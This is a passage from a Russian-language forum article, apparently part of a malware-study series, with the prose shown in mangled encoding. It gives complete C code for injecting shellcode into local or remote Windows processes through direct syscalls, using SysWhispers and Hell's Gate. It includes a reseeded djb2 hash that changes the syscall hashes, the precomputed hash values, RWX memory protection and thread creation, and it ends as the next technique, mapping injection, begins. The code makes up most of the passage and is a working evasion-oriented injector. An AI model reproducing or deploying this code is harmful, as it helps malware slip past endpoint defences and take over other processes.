<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;



    // Allocating memory
    if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------
    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------
    // Changing the memory&#039;s permissions to RWX
    if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º </b><a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener"><b>Hell&#039;s Gate</b></a><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω—è—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –¥–ª—è —ç—Ç–æ–≥–æ –º–æ–¥—É–ª—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Hell&#039;s Gate. –°–Ω–∞—á–∞–ª–∞ —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ç–µ –∂–µ —à–∞–≥–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω—ã –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–µ–∫—Ç–∞ Visual Studio —Å SysWhispers3, –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –∏ –∑–¥–µ—Å—å. –í —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –≤–∫–ª—é—á–µ–Ω–∏–µ MASM –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–≤–æ–π—Å—Ç–≤ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ–∞–π–ª–∞ ASM –Ω–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏—é —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Microsoft Macro Assembler.<br />
<br />
<b>–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</b><br />
<br />
–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–Ω–µ—Å—Ç–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∫–æ–¥ Hell&#039;s Gate. –°–Ω–∞—á–∞–ª–∞ —Ñ—É–Ω–∫—Ü–∏—è <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166" target="_blank" class="link link--external" rel="noopener">Payload</a> –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –∑–∞–º–µ–Ω–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–µ–π ClassicInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;


    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã</b> <b>VX_TABLE</b><br />
<br />
–î–∞–ª–µ–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É VX_TABLE —Å –∏–º–µ–Ω–∞–º–∏ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;    // –≠–ª–µ–º–µ–Ω—Ç —Ç–∞–±–ª–∏—Ü—ã –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    VX_TABLE_ENTRY NtWriteVirtualMemory;       // –≠–ª–µ–º–µ–Ω—Ç —Ç–∞–±–ª–∏—Ü—ã –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    VX_TABLE_ENTRY NtProtectVirtualMemory;     // –≠–ª–µ–º–µ–Ω—Ç —Ç–∞–±–ª–∏—Ü—ã –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    VX_TABLE_ENTRY NtCreateThreadEx;           // –≠–ª–µ–º–µ–Ω—Ç —Ç–∞–±–ª–∏—Ü—ã –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è Seed Value</b><br />
<br />
–ë—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ <b>Seed Value</b> –¥–ª—è –∑–∞–º–µ–Ω—ã —Å—Ç–∞—Ä–æ–≥–æ, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –§—É–Ω–∫—Ü–∏—è —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è djb2 –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –Ω–æ–≤—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º <b>Seed Value </b>–Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // –°—Ç–∞—Ä–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
–¢–µ–ø–µ—Ä—å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–π djb2 –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–π (–ù–∞–ø–∏—à–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞–ø—Ä–∏–º–µ—Ä):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtAllocateVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtWriteVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtProtectVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746786813914.png"
		data-src="https://osint42.org/attachments/1746786813914-png.233/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786813914-png.233/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786813914.png"
			title="1746786813914.png"
			width="1341" height="120" loading="lazy" />
	</div><br />
<br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ –∑–Ω–∞—á–µ–Ω–∏—è —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω—ã, –¥–æ–±–∞–≤—å—Ç–µ –∏—Ö –≤ –Ω–∞—á–∞–ª–æ –ø—Ä–æ–µ–∫—Ç–∞ Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2  0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2     0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2   0xA0DCC2851566E832
#define NtCreateThreadEx_djb2         0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∞ (–ù–∞ –∫–æ–¥ –Ω–∏–∂–µ), —á—Ç–æ–±—ã –≤—ã–∑—ã–≤–∞—Ç—å ClassicInjectionViaSyscalls –≤–º–µ—Å—Ç–æ <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. –§—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—ã—à–µ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ö—ç—à–∏, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTIONif (!ClassicInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!ClassicInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>–õ–æ–∫–∞–ª—å–Ω–∞—è –∏ —É–¥–∞–ª–µ–Ω–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è </b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ClassicInjectionViaSyscalls –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –∫–∞–∫ –Ω–∞ —É—Ä–æ–≤–Ω–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ç–∞–∫ –∏ –Ω–∞ —É—Ä–æ–≤–Ω–µ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –±—ã–ª –ø–æ—Å—Ç—Ä–æ–µ–Ω –º–∞–∫—Ä–æ–∫–æ–¥ –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞ –¥–ª—è —Ü–µ–ª–µ–≤–æ–≥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –µ—Å–ª–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ LOCAL_INJECTION.<br />
<br />
–ö–æ–¥ –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞ –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define LOCAL_INJECTION
#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ PID
#define PROCESS_ID    18784
#endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
#define LOCAL_INJECTION –º–æ–∂–Ω–æ –∑–∞–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ–±—ã –Ω–∞—Ü–µ–ª–∏—Ç—å—Å—è –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç —Ü–µ–ª–µ–≤—ã–º –ø—Ä–æ—Ü–µ—Å—Å —Å PID, —Ä–∞–≤–Ω—ã–º PROCESS_ID.<br />
–ï—Å–ª–∏ #define LOCAL_INJECTION –Ω–µ –∑–∞–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω, —á—Ç–æ —è–≤–ª—è–µ—Ç—Å—è –Ω–∞—Å—Ç—Ä–æ–π–∫–æ–π –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –≤ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–º –∫–æ–¥–µ, —Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Å–µ–≤–¥–æ-–¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ä–∞–≤–Ω—ã–π (HANDLE)-1.<br />
<br />
<b>–î–µ–º–æ<br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ SysWhispers –ª–æ–∫–∞–ª—å–Ω–æ.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786830441.png"
		data-src="https://osint42.org/attachments/1746786830441-png.234/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786830441-png.234/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786830441.png"
			title="1746786830441.png"
			width="1836" height="911" loading="lazy" />
	</div><br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ SysWhispers —É–¥–∞–ª–µ–Ω–Ω–æ</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786836575.png"
		data-src="https://osint42.org/attachments/1746786836575-png.235/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786836575-png.235/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786836575.png"
			title="1746786836575.png"
			width="1872" height="806" loading="lazy" />
	</div><br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Hell&#039;s Gate –ª–æ–∫–∞–ª—å–Ω–æ.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786842948.png"
		data-src="https://osint42.org/attachments/1746786842948-png.236/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786842948-png.236/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786842948.png"
			title="1746786842948.png"
			width="1753" height="871" loading="lazy" />
	</div><br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Hell&#039;s Gate —É–¥–∞–ª–µ–Ω–Ω–æ.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786849444.png"
		data-src="https://osint42.org/attachments/1746786849444-png.237/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786849444-png.237/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786849444.png"
			title="1746786849444.png"
			width="1830" height="763" loading="lazy" />
	</div><br />
<br />
<br />
<b>–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ–ø–∏—à–µ–º —ç—Ç—É —Ç–µ—Ö–Ω–∏–∫—É:</b> –ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–í —ç—Ç–æ–π —á–∞—Å—Ç–∏ —Ç–µ—Ö–Ω–∏–∫–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏ –º–∞–ø–ø–∏–Ω–≥–∞, –æ–±—Å—É–∂–¥–∞–µ–º–∞—è —Ä–∞–Ω–µ–µ, –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Å –ø–æ–º–æ—â—å—é –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∑–∞–º–µ–Ω—è—è WinAPI –Ω–∞ –∏—Ö —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤:<br />
<br />
CreateFileMapping –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtCreateSection<br />
<br />
MapViewOfFile –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtMapViewOfSection<br />
<br />
CloseHandle –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtClose<br />
<br />
UnmapViewOfFile –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtUnmapViewOfSection<br />
<br />
<b>–ü–∞—Ä–∞–º–µ—Ç—Ä—ã Syscall</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è, –∏ –∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –±—É–¥—É—Ç –æ–±—ä—è—Å–Ω–µ–Ω—ã.<br />
<br />
<b>NtCreateSection</b><br />
<br />
